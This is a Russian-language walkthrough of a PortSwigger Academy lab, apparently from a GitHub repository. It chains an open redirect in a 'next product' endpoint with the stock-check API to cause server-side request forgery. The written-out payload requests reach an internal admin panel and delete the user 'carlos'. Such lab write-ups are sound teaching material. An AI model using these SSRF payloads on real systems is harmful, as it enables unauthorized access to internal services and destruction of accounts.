на админскую панель нет смысла идти, там у нас недостаточно прав, все как в прошлых лабораторных работах
Перейдем на рандомный товар и проверим его наличие, нажав `Get stock`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/5.%20SSRF%20with%20filter%20bypass%20via%20open%20redirection%20vulnerability/pics%20for%20walktrough/1.png)
Перейдем в `Proxy` -> `HTTP history` и найдем данный запрос
```
POST /product/stock
...
stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/5.%20SSRF%20with%20filter%20bypass%20via%20open%20redirection%20vulnerability/pics%20for%20walktrough/2.png)
А вот если в веб-интерфейсе находясь на карточке одного из товаров, перейти на следующий через кнопку действия `Next product` получим следующий http-запрос
```
GET /product/nextProduct?currentProductId=1&path=/product?productId=2 
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/5.%20SSRF%20with%20filter%20bypass%20via%20open%20redirection%20vulnerability/pics%20for%20walktrough/3.png)
Протестируем наличие SSRF уязвимости, используя знание о `/product/nextProduct...` и Ip адреса, данном в условии задания `http://192.168.0.12:8080`
```
POST /product/stock
...
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/5.%20SSRF%20with%20filter%20bypass%20via%20open%20redirection%20vulnerability/pics%20for%20walktrough/4.png)
далее удалим УЗ `carlos` согласно полученному заданию
```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```
и получим уведомление об успешном решении лабораторной работы
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/5.%20SSRF%20with%20filter%20bypass%20via%20open%20redirection%20vulnerability/pics%20for%20walktrough/5.png)
